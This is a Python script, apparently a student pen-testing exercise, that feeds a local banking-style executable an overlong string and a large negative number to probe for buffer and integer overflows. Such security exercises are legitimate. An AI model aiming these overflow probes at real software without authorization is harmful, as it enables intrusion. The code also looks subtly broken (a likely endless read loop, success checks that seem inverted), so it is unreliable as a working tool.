import re
import click
import subprocess as sp
from time import sleep


class AutomatedPenTest:
    def __init__(self, process, user_name, bank_account):
        self.bank_account = bank_account
        self.process = process
        self.user_name = user_name

    def begin_pen_test(self):      
        confirmed_vulnerabilities = []
        process_opened = sp.Popen([self.user_name]
                        ,executable="./" + self.process
                        ,stdin=sp.PIPE
                        ,stderr=sp.PIPE
                        ,stdout=sp.PIPE
                        ,universal_newlines=True
                        )
        process_opened.stdin.write("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n")
        for lines in iter(process_opened.stdout.readline, b''):
            print(">>>" + lines.rstrip())
        if not re.match("Wrong password", process_opened.stdout.read()):
            click.echo("Buffer overflow failed to gain access to the application, exiting process now!")
            process_opened.kill()
            exit(1)
        confirmed_vulnerabilities.insert(1, "Buffer overflow is confirmed vulnerability")

        process_opened.stdin.write(self.bank_account)
        sleep(3)
        process_opened.stdin.write("-21476511480\n")
        if not re.match("Remains", process_opened.stdout.read()):
            click.echo("Integer overflow failed, exiting process now!")
            process_opened.kill()
            exit(1)

        confirmed_vulnerabilities.insert(2, "Integer overflow is confirmed vulnerability")

        process_opened.kill()
        print("Penetration testing terminated with success")

        for items in confirmed_vulnerabilities:
            click.echo("\n" + items + " " + u'\u2713')
